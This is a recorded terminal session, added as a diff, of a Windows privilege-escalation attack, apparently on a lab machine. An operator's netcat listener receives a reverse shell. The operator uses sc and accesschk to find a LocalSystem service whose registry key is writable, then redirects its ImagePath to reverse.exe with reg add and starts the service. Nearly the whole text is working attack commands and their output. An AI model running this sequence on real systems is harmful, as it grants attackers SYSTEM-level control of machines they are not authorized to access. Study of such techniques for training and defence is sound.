@@ -1,0 +1,48 @@
+Script started on 2025-03-16 06:32:20+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 10358
+Microsoft Windows [Version 10.0.17763.737][KMicrosoft Windows [Version 10.0.17763.737][KMicrosoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\user>[KC:\Users\user>[K[?2004hC:\Users\user>[7msc qc regsvc[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsc qc regsvc
+[Ksc qc regsvc
+[K[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: regsvc
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Insecure Registry Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+
+C:\Users\user>[KC:\Users\user>[K[?2004hC:\Users\user>[7mC:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hC:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+[KC:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+[KHKLM\System\CurrentControlSet\Services\regsvc
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW NT AUTHORITY\SYSTEM
+	KEY_ALL_ACCESS
+  RW BUILTIN\Administrators
+	KEY_ALL_ACCESS
+  RW NT AUTHORITY\INTERACTIVE
+	KEY_ALL_ACCESS
+[K
+C:\Users\user>[KC:\Users\user>[K[?2004hC:\Users\user>[7mreg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\[27m[7mP[27m[7mrivEsc\reverse.exe /f[27m[A[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hreg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+[Kreg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+[KThe operation completed successfully.
+
+C:\Users\user>[KC:\Users\user>[K[?2004hC:\Users\user>[7mnet start regsvc[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hnet start regsvc
+[Knet start regsvc
+[KThe service is not responding to the control function.
+[K
+More help is available by typing NET HELPMSG 2186.
+
+
+C:\Users\user>[KC:\Users\user>[K[?2004hC:\Users\user>exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+[?2004l
+Script done on 2025-03-16 06:36:27+03:00 [COMMAND_EXIT_CODE="0"]
